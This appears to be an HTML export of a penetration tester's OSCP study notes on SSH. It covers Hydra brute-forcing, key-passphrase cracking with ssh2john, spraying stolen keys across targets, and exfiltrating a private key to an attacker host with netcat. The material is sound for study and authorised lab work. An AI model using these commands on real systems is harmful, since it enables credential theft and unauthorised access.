<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SSH</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SSH</h1><br/><p>More SSH info in <a href="Pivoting_22.html#ssh setup">Pivoting</a> &amp; setup root SSH access in <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#root ssh">Sysadmin</a>.</p><p></p><p><h1>Tips</h1><ul><li>Use SSH Connection to get very stable shell. May be able to create SSH key on Target &amp; use that to connect to running Server; otherwise set up SSH Server on Atker &amp; transfer key to Client [OSCP 175-176]</li></ul></p><p><ul><li>If using target to pivot via SSH, <span style="color:#ff0000;">need stablized shell</span>. For ex, <em>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</em></li></ul></p><p><ul><li>SSH <a href="Recon_+_Services--WebApp_12.html#Find SSH Key">private keys</a> may have diff names</li></ul></p><p><ul><li>â˜… Try the same SSH logons against ALL TARGETS (i.e same user, priv key ,passwd)  </li></ul></p><p> <ul><li><span style="color:#ff0000;">Check other ports</span>! Some linux hosts use port 2222 instead of port 22, but any port can be used. Specify port like- </li></ul></p><p>	<em>ssh anita@192.168.239.245 -p 2222 -i id_ecdsa</em></p><p>	<ul><li>Must <span style="color:#ff0000;">specify args AFTER connection info</span> (the opposite of scp). For ex,</li></ul></p><p>	 <em>ssh anita@192.168.233.246 -p 2222 -i ~/Documents/relia/anita.ssh</em></p><p>	<ul><li>There are usually 3 Config files with different info, but they all have similar names. To see list of allowed users, try-</li></ul></p><p>	<em>cat /etc/ssh/sshd_config</em>		(Not /etc/ssh/ssh_config)</p><p>	</p><p>	</p><p><h1>Troubleshooting</h1></p><p><h2>Permission denied (publickey)</h2></p><p>This means that the server didn&#39;t find a priv key matching the pub key(s) in <strong>authorized_keys</strong> file.</p><p></p><p>Could indicate that you need a <span style="color:#ff0000;">diff priv key</span>, or that you need to <span style="color:#ff0000;">try with a diff username</span> (since user is incl in the <strong>authorized_keys</strong> file entry). For ex, try-</p><p></p><p><em>for i in $(cat usernames.txt);do ssh $i@172.16.123.19 -i ~/Documents/relia/anita.ssh; done</em></p><p></p><p><h1>Brute Force</h1><h1></h1></p><p><h1></h1>See <a href="file:///usr/share/wordlists/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt">list of common creds</a></p><p>It&#39;s reccomended to use the <strong>-t 4</strong> argument, limiting it to 4 parallel tasks (may be unneccesary, &amp; just slow you down).</p><p></p><p>Use a list of known usernames. Can also use a known passwd for Password Spraying.</p><p></p><p><em>hydra -l offsec -P /usr/share/wordlists/rockyou.txt -f -t 4 -V 192.168.238.122 ssh</em><h1></h1></p><p><h1></h1><h1></h1></p><p><h1>Key Password Extraction</h1></p><p>Extract the passwd hash from an encrypted Private Key, &amp; then crack that hash to get the passwd.</p><p></p><p>The passwd can be used with the private key, &amp; <span style="color:#ff0000;">should be tried elsewhere</span> (i.e as the <span style="color:#ff0000;">sudo</span> passwd)</p><p></p><p><em>ssh2john id_rsa &gt; id_rsa.hash</em></p><p></p><p><h1>Exporting Key</h1></p><p>After transfering to Atker, set perms on the key</p><p><em>chmod 600 id_rsa</em></p><p></p><p><h2>Transferring Key</h2></p><p></p><p>scp via SSH connection, if the SSH acct has the perms needed to access the key. Specify source then destination-</p><p></p><p><em>scp offsec@192.168.238.122:/home/mario/.ssh/id_rsa ./</em></p><p></p><p> netcat over a shell. Can check shasums to verify transfer completed correctly (or checking file length is the lazy/less accurate way)</p><p> </p><p> {Atker} <em>nc -lvnp 80 &gt; ssh_key</em></p><p> {Target} <em>nc ATKER 80 &lt; id_rsa</em></p><p></p><p><h3>Copy/Pasting</h3></p><p>May be only option (e.g exploiting Dir Trav in WebApp). </p><p>Key&#39;s formatting MUST be the same (correct spacing, etc).</p><p>I&#39;ve had success viewing the page&#39;s source code (or viewing in burpsuite) &amp; copying it from there.</p><p></p><p><h1>IP/Host Restrictions</h1></p><p>May only be able to SSH into a target using a specific host.</p><p>In some cases using a tunnel like Ligolo-ng won&#39;t work (when run on a different host in the same LAN).</p><p></p><p>SSH over SSH Connection</p><p></p><p><h1>Windows</h1></p><p>[OSCP 178-180]</p><p>Modern Windows sys come with OpenSSH Client, &amp; Win SSH Clients can connect to Linux SSH Servers (or vice versa).</p><p>Windows SSH servers aren&#39;t as common as Linux SSH Servers, due to the alternatives (e.g RDP, WinRM, or even VNC).</p><p>Also see Putty &amp; <a href="Pivoting_22.html#plink">Plink</a></p><p></p><p><a name="openssh"></a><h2>OpenSSH (ssh.exe)</h2></p><p>Transfer private key to a specific User&#39;s dir to handle permissions (don&#39;t use \Users\Public), this will be akin to <em>chmod 600</em> for Linux. If there&#39;s still an issue, see this <a href="https://superuser.com/questions/1296024/windows-ssh-permissions-for-private-key-are-too-open">link</a></p><p></p><p><h1>scp</h1></p><p>Requires uppercase <strong>-P</strong> to specify non-def port, unlike lowercase <strong>-p</strong> for normal ssh. </p><p></p><p>Must specify arguments before either file path (e.g start with -i &amp; -P).</p><p></p><p><em>scp -i id_rsa -P 2222 /usr/bin/sucrack anita@TARGET:/home/anita/</em></p><p></p><p><h2>Recursive File Transfer</h2></p><p>Use<strong> -r</strong> to recursively copy directories.</p><p></p><p><em>scp -o UserKnownHostsFile=/dev/null -r ./static johncusack@dog.htb:/tmp/</em></p><p></p><p><h2>Windows</h2></p><p>If target is Windows machine, specify filepath with <strong>/</strong> instead of <strong>\</strong></p><p></p><p><h1>Def Config Files</h1></p><p><h2>Client</h2><h2></h2></p><p><h2></h2>/etc/ssh/ssh_config</p><p>/etc/ssh/ssh_config.d/*.conf</p><p><h2></h2></p><p><h2>Server</h2></p><p>/etc/ssh/sshd_config</p><p>/etc/ssh/sshd_config.d/*.conf</p><p></p><p><h1>Disable Strict Hostkey Checks</h1></p><p><em>ssh user@host -o UserKnownHostsFile=/dev/null</em></p><p></p><p><em>scp -o UserKnownHostsFile=/dev/null linpeas.sh safeadmin@bandit.escape:/tmp/linpeas.sh</em></p></div>
</body>
</html>
